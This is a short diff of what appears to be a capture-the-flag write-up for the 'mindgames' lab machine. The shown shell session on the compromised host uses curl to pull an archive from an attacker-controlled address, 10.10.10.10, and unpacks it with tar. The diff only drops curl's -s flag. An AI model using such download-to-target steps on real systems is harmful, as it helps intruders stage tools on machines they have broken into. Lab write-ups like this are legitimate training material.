@@ -101,7 +101,7 @@ mindgames@mindgames:~/webserver$ cd ../../
 cd ../../
 
 mindgames@mindgames:~$ curl -s http://10.10.10.10/1.tar -o 2.tar
-curl -s http://10.10.10.10/1.tar -o 2.tar
+curl http://10.10.10.10/1.tar -o 2.tar
 
 mindgames@mindgames:~$ tar -xvf 2.tar
 tar -xvf 2.tar
